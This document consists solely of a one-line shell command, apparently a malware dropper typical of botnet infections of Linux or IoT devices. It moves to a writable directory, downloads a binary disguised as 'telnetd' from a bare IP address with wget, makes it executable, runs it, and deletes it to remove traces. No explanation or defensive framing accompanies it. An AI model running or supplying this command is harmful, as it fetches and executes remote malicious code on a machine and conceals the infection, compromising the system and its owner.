cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://66.172.27.87/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
